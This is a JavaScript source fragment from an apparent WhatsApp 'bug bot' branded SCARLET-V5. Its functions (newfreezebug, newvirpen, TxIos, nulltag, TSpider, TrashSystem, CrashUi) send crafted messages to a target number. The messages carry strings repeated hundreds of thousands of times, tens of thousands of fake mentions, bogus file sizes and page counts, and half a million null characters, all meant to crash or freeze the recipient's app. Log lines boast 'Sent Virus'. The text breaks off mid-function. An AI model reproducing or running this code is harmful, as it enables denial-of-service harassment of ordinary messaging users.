			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
				   'key': {
                    'remoteJid': 'status@broadcast',
                     'fromMe': false,
                      'participant': '0@s.whatsapp.net'
                },
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": `${buttonkal}`,
							"jpegThumbnail": "",
							"caption": `𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await bad.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': null
			});
		}
async function newfreezebug(target) {
    let virus = "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5";

    await bad.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 7777099.1,
                            degreesLongitude: -922.999999999999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5" + "@scarlet 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function newvirpen(target) {
    let virus = "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@null"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virus 
                        }]
                    }
                }
            }
        }
    };

    await bad.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}
async function TxIos(target, Ptcp = false) {
			await bad.relayMessage(target, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895364760801@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895364760801@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈〽",
								"body": "尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isbadboiboipled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug By 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝐁𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈"));
		};
    //========================
    async function nulltag(target, ptcp = false) {
			await bad.relayMessage(target, {
					extendedTextMessage: {
						text: "‎scarlet 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲\n" + "~@0~\n".repeat(30000),
						contextInfo: {
							mentionedJid: [
								"0@null",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@null`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@null",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@null",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: target,
							conversionSource: " p ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " p ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " p "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "̟",
								body: "̟",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " p ",
								sourceId: " p ",
								sourceUrl: "p",
								mediaUrl: "p",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "p"
							},
							groupSubject: " p ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " p ",
							trustBannerAction: 1,
							isbadboiboipled: false,
							utm: {
								utmSource: " p ",
								utmCampaign: " p "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " p ",
								contentType: "UPDATE",
								accessibilityText: " p "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("bot Sent Virus ✅ By 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝐁𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈"));
		};
    //========================
    async function TSpider(target, pic, Ptcp = true) {
   await bad.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: pic,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝐁𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈\n" + "@6285655649546".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 ϟ〽️', url: \"https://youtube.com/king_badboiboi_hub\", merchant_url: \"https://youtube.com/king_badboiboi_hub\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
   console.log(chalk.green("Send Bug By 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5〽️"));
  };
async function TrashSystem(target, spider, Ptcp = true) {
   await bad.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: spider,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5\n" + "@6285655649546".repeat(17000),
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: spider,
          },
         },
        },
       },
      },
     },
    },
    ptcp ? { participant: { jid: target } } : {}
    );
};

/*QUOTED BUG SENDER*/
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}

/*BUG SENDER CRASH HARD*/
    async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻",
                    fileEncSha256:
